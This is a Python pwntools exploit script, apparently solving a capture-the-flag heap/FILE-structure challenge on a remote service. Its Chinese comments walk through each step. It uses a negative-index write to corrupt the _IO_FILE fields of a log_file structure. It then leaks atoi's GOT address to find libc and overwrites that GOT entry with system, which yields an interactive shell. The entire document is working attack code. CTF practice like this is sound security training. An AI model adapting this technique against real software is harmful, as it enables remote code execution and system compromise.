from pwn import *
from LibcSearcher import LibcSearcher

context.log_level = 'DEBUG'
elf = context.binary = ELF('../file/c2f66c2226de4c0d960063a9734350c0')
# p = process('../file/c2f66c2226de4c0d960063a9734350c0')
p = remote('61.147.171.105', '63671')

def create():
    p.sendlineafter(b'choice>> ', b'1')
    p.sendlineafter(b'name:', b'aaaa')

def spell(idx, data):
    p.sendlineafter(b'choice>> ', b'2')
    p.sendlineafter(b'spell:', str(idx).encode())
    p.sendafter(b'name:', data)

# 初始化log_file
create()
spell(0, b'aaaa')

for i in range(8):
    # _IO_write_base + 1 - 50
    spell(-2, b'\0')

# 不影响结构体 _IO_write_base + 13 - 50
spell(-2, b'\0' * 13)

for i in range(3):
    # _IO_write_base + 1 - 50
    spell(-2, b'\0')

# 不影响结构体 _IO_write_base + 9 - 50
spell(-2, b'\0' * 9)

# _IO_write_base + 1 - 50
spell(-2, b'\0')

# 现在_IO_write_base指向log_file结构体附近
payload = b'\0' * 3 + p64(0x231) + p64(0xfbad24a8)
spell(0, payload)

# 修改_IO_read_ptr和_IO_read_end
payload = p64(elf.got['atoi']) + p64(elf.got['atoi'] + 0x100)
spell(0, payload)
atoi_addr = u64(p.recv(8))

libc = LibcSearcher('atoi', atoi_addr)
libc_base = atoi_addr - libc.dump('atoi')
system_addr = libc_base + libc.dump('system')

# 回到结构体前
spell(-2, p64(0) + p64(0))
spell(0, b'\0' * 2 + p64(0x231) + p64(0xfbad24a8))

# 设置_IO_read_ptr大于等于_IO_read_end
spell(0, p64(elf.sym['log_file']) + p64(elf.sym['log_file'] + 0x50) + p64(elf.sym['log_file']))

# 泄露存储log_file的heap chunk地址
heap_addr = u64(p.recv(8)) - 0x10

spell(0, p64(heap_addr + 0x100) * 3)

# 覆盖_IO_buf_base和_IO_buf_end，然后程序中执行fread就会修改_IO_write_ptr为_IO_buf_base  
spell(0, p64(elf.got['atoi'] + 0x78 + 23) + p64(elf.got['atoi'] + 0xa00))

spell(-2, b'\0')
spell(-2, b'\0' * 3)
spell(-2, b'\0' * 3)

payload = b'\0' + p64(system_addr)
spell(0, payload)

p.sendlineafter(b'choice>> ', b'sh')

p.interactive()